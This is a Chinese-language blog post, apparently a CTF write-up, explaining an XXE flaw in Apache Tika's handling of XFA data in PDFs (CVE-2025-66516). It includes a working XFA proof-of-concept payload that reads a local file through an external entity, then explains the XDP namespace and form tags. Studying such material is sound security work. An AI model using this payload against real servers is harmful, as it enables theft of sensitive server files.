---
title: Apache Tika XXE漏洞(CVE-2025-66516)
date: 2026-02-27
tags: [XXE专题]
categories: [Web安全]
excerpt: 一个由PDF导致的XXE
---

# CVE-2025-66516

## 漏洞简介

攻击者可以通过上传一个特制的PDF文件，远程窃取服务器敏感信息或执行其他恶意操作，且整个过程无需用户交互。

## 漏洞详情

**漏洞名称**：Apache Tika XML外部实体注入漏洞（XXE）
**影响对象**：Apache Tika 是一个开源内容分析工具包，广泛用于从各种文件中提取文本和元数据，常被集成于搜索引擎、内容管理系统等
**漏洞类型**：XXE

## 漏洞原理

该漏洞源于Apache Tika在处理PDF文件中的 XFA（XML表单架构）数据 时，未能安全地限制XML外部实体的加载。（XFA是一份藏在PDF文件里的XML代码）

1. **攻击向量**：攻击者将恶意构造的XFA文件嵌入到一个看似正常的PDF文件中。
2. **触发机制**：当存在漏洞的Apache Tika服务解析这个PDF文件时，会不当地处理XFA中的恶意XML外部实体。
3. **技术细节**：问题出在Tika核心（tika-core）的 `XMLReaderUtils` 类在创建 `XMLStreamReader` 时，未对外部实体和DTD进行有效防护，导致XXE攻击发生。

## POC（以UNICTF2025的SecureDoc为例）

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xdp:xdp [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
  <template>
    <subform>
      <field name="exploit">
        <value>
          <text>FLAG_CONTENT_BELOW:
&xxe;

FLAG_CONTENT_ABOVE</text>
        </value>
      </field>
    </subform>
  </template>
</xdp:xdp>
```

这个POC中有很多标签，是为了欺骗解析器，让它误以为这是一个合法的XFA文档，从而触发漏洞。

`<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">`这段代码是声明命名空间。`xmlns:xdp="http://ns.adobe.com/xdp/"`这部分里`xmlns`是XML Namespace的简称，可以理解为一个叫做xdp的变量被赋值为http://ns.adobe.com/xdp/。而`xdp:xdp`中，前一个xdp就是这个“变量”，后面的xdp则是真正的XML标签。因此这段代码的意思是：**在 Adobe XDP 命名空间下的根元素 xdp**

### 为什么要这么写

在 XFA（XML Forms Architecture）规范中，Adobe 规定：**所有 XDP（XML Data Package）文档的根元素必须是命名空间 http://ns.adobe.com/xdp/ 下的 xdp标签**

而剩下来那些标签都是<xdp>标签的子标签。（看到这我感觉有点像文件包含，在学习XXE时我也感觉XXE也和文件包含很像）。

那些标签具体的意思：

```markdown
<template>：定义整个表单的模板
<subform>：定义一个子表单
<field>：定义一个具体的表单字段 （这个标签的name属性是必填的）
<value>：定义该字段的值
<text>：定义该值的类型为文本
```

